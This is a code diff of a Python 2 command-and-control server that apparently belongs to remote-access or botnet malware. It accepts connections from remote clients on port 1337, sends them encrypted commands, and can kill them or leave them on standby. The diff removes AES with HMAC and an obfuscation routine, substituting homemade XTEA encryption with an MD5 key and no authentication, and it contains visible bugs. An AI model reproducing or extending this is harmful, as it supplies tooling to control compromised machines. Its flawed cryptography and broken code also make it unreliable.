@@ -56,9 +56,7 @@ import subprocess
 import socketserver
 import logging.handlers
 from base64 import b64encode, b64decode
-from Crypto.Cipher import AES
-from Crypto.Hash import SHA256, HMAC
-from Crypto.Util.number import bytes_to_long, long_to_bytes
+
 
 # globals
 
@@ -85,20 +83,25 @@ Server Commands
 
 class Server(threading.Thread):
     global exit_status
+    global __command__
+    __command__ = {}
     def __init__(self, host='0.0.0.0', port=1337):
         super(Server, self).__init__()
         self.count          = 0
         self.lock           = threading.Event()
         self.current_client = None
         self.clients        = {}
-        self.commands       = {
+        self.commands       = {cmd: getattr(self, cmd) for cmd in __command__}
+        self.commands.update({
 	    'back'	    :   self.deselect_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
 	    'sendall'	    :   self.sendall_clients,
-            '--help'        :   self.print_help
-            }
+            'usage'         :   self.usage,
+            'server'        :   self.usage,
+            '--help'        :   self.usage
+            })
         self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -106,70 +109,114 @@ class Server(threading.Thread):
         self.s.listen(5)
         self.lock.set()
 
-    def pad(self, data):
-        return data + b'\0' * (AES.block_size - len(data) % AES.block_size)
+    def _pad(self, s): return s + (self.encryption['block_size'] - len(bytes(s)) % self.encryption['block_size']) * '\x00'
+
+    def _block(self, s): return [s[i * self.encryption['block_size']:((i + 1) * self.encryption['block_size'])] for i in range(len(s) // self.encryption['block_size'])]
+
+    def _xor(self, s, t): return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+
+    def _long_to_bytes(self, x):
+        try:
+            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
+        except Exception as e:
+            if '__v__' in vars(self) and self.__v__:
+                print "Long-to-bytes conversion error: {}".format(str(e))
+
+    def _bytes_to_long(self, x):
+        try:
+            return long(bytes(x).encode('hex'), 16)
+        except Exception as e:
+            if '__v__' in vars(self) and self.__v__:
+                print "Bytes-to-long conversion error: {}".format(str(e))
+
+    @property
+    def __encryption(self):
+        return {'endian': '<' if sys.byteorder == 'little' else '!', 'rounds': 32, 'block_size': 8}
+
+    def _encryption(self, block, dhkey):
+        v0, v1  = struct.unpack(self.encryption['endian'] + "2L", block)
+        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
+        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
+        for round in range(self.encryption['rounds']):
+            v0  = (v0 + (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
+            sum = (sum + delta) & mask
+            v1  = (v1 + (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
+        return struct.pack(self.encryption['endian'] + "2L", v0, v1)
+
+    def _decryption(self, block, dhkey):
+        v0, v1  = struct.unpack(self.encryption['endian'] +"2L", block)
+        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
+        delta,mask = 0x9e3779b9L, 0xffffffffL
+        sum     = (delta * self.encryption['rounds']) & mask
+        for round in range(self.encryption['rounds']):
+            v1  = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
+            sum = (sum - delta) & mask
+            v0  = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
+        return struct.pack(self.encryption['endian'] + "2L", v0, v1)
 
     def diffiehellman(self, connection, bits=2048):
         p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
         g = 2
-        a = bytes_to_long(os.urandom(32))
+        a = self._bytes_to_long(os.urandom(32))
         xA = pow(g, a, p)
-        connection.sendall(long_to_bytes(xA))
-        xB = bytes_to_long(connection.recv(256))
+        connection.sendall(self._long_to_bytes(xA))
+        xB = self._bytes_to_long(connection.recv(256))
         x = pow(xB, a, p)
-        return SHA256.new(long_to_bytes(x)).digest()
+        return sys.modules['hashlib'].new('md5', string=self._long_to_bytes(x)).digest()
 
-    def encrypt(self, dhkey, plaintext):
-        text        = self.pad(plaintext)
-        iv          = os.urandom(AES.block_size)
-        cipher      = AES.new(dhkey[:16], AES.MODE_CBC, iv)
-        ciphertext  = iv + cipher.encrypt(text)
-        hmac_sha256 = HMAC.new(dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
-        return b64encode(ciphertext + hmac_sha256)
+    @__encryption.getter
+    def encryption(self):
+	return self.__encryption
 
-    def decrypt(self, dhkey, encrypted):
-        ciphertext  = b64decode(encrypted)
-        iv          = ciphertext[:AES.block_size]
-        cipher      = AES.new(dhkey[:16], AES.MODE_CBC, iv)
-        hash_check  = ciphertext[-SHA256.digest_size:]
-        verify      = HMAC.new(dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
-        if verify  != hash_check:
-            print "Warning: HMAC-SHA256 hash authentication failed"
-        return cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size]).rstrip(b'\0')
+    def _encrypt(self, data, dhkey):
+        padded = self._pad(data)
+        blocks = self._block(padded)
+        vector = os.urandom(8)
+        result = [vector]
+        for block in blocks:
+            try:
+                encode = self._xor(vector, block)
+                output = vector = self._encryption(encode, dhkey)
+                result.append(output)
+            except Exception as e:
+                print str(e)
+        return b64encode(''.join(result))
 
-    def deobfuscate(self, block):
-        p = []
-        block = b64decode(block)
-        for i in xrange(2, len(block)):
-            is_mul = False
-            for j in p:
-                if i % j == 0: 
-                    is_mul = True
-                    break
-            if not is_mul:
-                p.append(i)
-        output = str().join([block[i] for i in p])
-        return self._long_to_bytes(long(output, 2))
+    def _decrypt(self, data, dhkey):
+        blocks = self._block(b64decode(data))
+        result = []
+        vector = blocks[0]
+        for block in blocks[1:]:
+            try:
+                decode  = self._decryption(block, dhkey)
+                output  = self._xor(vector, decode)
+                vector = block
+                result.append(output)
+            except Exception as e:
+                print str(e)
+        return ''.join(result).rstrip('\x00')
 
-    def obfuscate(self, data):
-        data    = bin(self._bytes_to_long(bytes(data)))
-        p       = []
-        block   = os.urandom(2)
-        for i in xrange(2, 10000):
-            is_mul = False
-            for j in p:
-                if i % j == 0:
-                    is_mul = True
-                    block += os.urandom(1)
-                    break
-            if not is_mul:
-                if len(data):
-                    p.append(i)
-                    block += data[0]
-                    data = data[1:]
-                else:
-                    return b64encode(block)
+    def command(fx, cx=__command__):
+        cx.update({fx.func_name: fx})
+        return fx
+    
+    @command
+    def encrypt(self, data, client_id):
+        if int(client_id) not in self.clients:
+            print "Invalid Client ID: '{}'".format(client_id)
+        else:
+            key = self.clients[int(client_id)]._dhkey
+            return self._encrypt(data, key)
 
+    @command
+    def decrypt(self, data, client_id):
+        if int(client_id) not in self.clients:
+            print "Invalid Client ID: '{}'".format(client_id)
+        else:
+            key = self.clients[int(client_id)]._dhkey
+            return self._decrypt(data, key)
+    
+    @command    
     def select_client(self, client_id):
         if self.lock.is_set():
             self.lock.clear()
@@ -177,68 +224,82 @@ class Server(threading.Thread):
             self.current_client.lock.clear()
         if int(client_id) not in self.clients:
             print '\nInvalid Client ID\n'
-            return
-        self.current_client = self.clients[int(client_id)]
-        print '\nClient {} selected\n'.format(client_id)
-        self.current_client.lock.set()
-        return self.current_client.run()
-
+        else:
+            self.current_client = self.clients[int(client_id)]
+            print '\nClient {} selected\n'.format(client_id)
+            self.current_client.lock.set()
+            return self.current_client.run()
+    
+    @command  
     def deselect_client(self):
-        if self.current_client:
-            if self.current_client.lock.is_set():
-                self.current_client.lock.clear()
+        if self.current_client and self.current_client.lock.is_set():
+            self.current_client.lock.clear()
         self.current_client = None
+        self.lock.set()
+    
+    @command  
+    def send_client(self, msg, client_id):
+        if int(client_id) not in self.clients:
+            print "Invalid Client ID: '{}'".format(client_id)
+        else:
+            client = self.clients[int(client_id)]
+            data = self.encrypt(msg, client.name) + '\n'
+            client.conn.sendall(data)
+    
+    @command  
+    def recv_client(self, client_id):
+        if int(client_id) not in self.clients:
+            print "Invalid Client ID: '{}'".format(client_id)
+        else:
+            client = self.clients[int(client_id)]
+            buffer, method, message  = "", "", ""
+            if client:
+                while "\n" not in buffer:
+                    buffer += client.conn.recv(4096)
+                if len(buffer):
+                    method, _, message = buffer.partition(':')
+                    message = server.decrypt(message, client.name)
+            return method, message
 
-    def send_client(self, msg, client=None):
-        if not client:
-            client = self.current_client
-        data = self.encrypt(client.dhkey, msg) + '\n'
-        client.conn.sendall(data)
-
+    @command  
     def sendall_clients(self, msg):
         for client in self.get_clients():
-            self.send_client(msg, client)
+            self.send_client(msg, client.name)
 
-    def recv_client(self, client=None):
-        client = client or self.current_client
-        buffer, method, message  = "", "", ""
-        if client:
-            while "\n" not in buffer:
-                buffer += client.conn.recv(4096)
-            if len(buffer):
-                method, _, message = buffer.partition(':')
-                message = server.decrypt(client.dhkey, message)
-        return method, message
-
+    @command  
     def remove_client(self, key):
         return self.clients.pop(int(key), None)
-
-    def selfdestruct_client(self, client_id=None):
-        if client_id:
-            client = self.clients.get(int(client_id)) or self.current_client
-            self.send_client('selfdestruct', client)
-            client.conn.close()
-            self.remove_client(client.name)
-
+    
+    @command  
+    def kill_client(self, client_id):
+        client = self.clients.get(int(client_id))
+        self.send_client('kill', client.name)
+        client.conn.close()
+        self.remove_client(client.name)
+    
+    @command  
     def get_clients(self):
         return [v for _, v in self.current_client.items()]
-
+    
+    @command  
     def list_clients(self):
         print '\nID | Client Address\n-------------------'
         for k, v in self.clients.items():
             print '{:>2} | {}'.format(k, v.addr[0])
         print '\n'
 
-    def print_help(self):
+    @command
+    def usage(self):
         print HELP_CMDS
-
+    
+    @command  
     def quit_server(self):
         q = raw_input('Exit the server and keep all clients alive (y/N)? ')
         if q.lower().startswith('y'):
             try:
                 for client in self.get_clients():
                     try:
-                        self.send_client('mode standby', client)
+                        self.send_client('mode standby', client.name)
                     except: pass
             finally:
                 sys.exit(0)
@@ -247,12 +308,13 @@ class Server(threading.Thread):
         while True:
             conn, addr  = self.s.accept()
             name        = len(self.clients) + 1
-            client      = ClientHandler(conn, addr, name)
+            client      = ConnectionHandler(conn, addr, name)
             self.clients[name] = client
             client.start()
             if exit_status:
                 break
-
+    
+    @command  
     def run(self):
         while True:
             if not self.manager.is_alive():
@@ -285,18 +347,17 @@ class Server(threading.Thread):
                 print output
 
 
-class ClientHandler(threading.Thread):
+class ConnectionHandler(threading.Thread):
     global server
-    global debug
     global exit_status
 
     def __init__(self, conn, addr, name):
-        super(ClientHandler, self).__init__()
+        super(ConnectionHandler, self).__init__()
         self.conn   = conn
         self.addr   = addr
         self.name   = name
         self.info   = {}
-        self.dhkey  = server.diffiehellman(conn)
+        self._dhkey = server.diffiehellman(conn)
         self.lock   = threading.Event()
                 
     def run(self, prompt=None):
@@ -304,7 +365,7 @@ class ClientHandler(threading.Thread):
             if exit_status:
                 break
             self.lock.wait()
-            method, data = ('prompt', prompt) if prompt else server.recv_client()
+            method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
             if 'prompt' in method:
                 command = raw_input(data % int(self.name))
                 cmd, _, action = command.partition(' ')
@@ -313,7 +374,7 @@ class ClientHandler(threading.Thread):
                     print result
                     return self.run(prompt=data)
                 else:
-                    server.send_client(command)
+                    server.send_client(command, self.name)
                     return self.run()
             else:
                 if data:
@@ -330,3 +391,4 @@ if __name__ == '__main__':
 
 
 
+ 
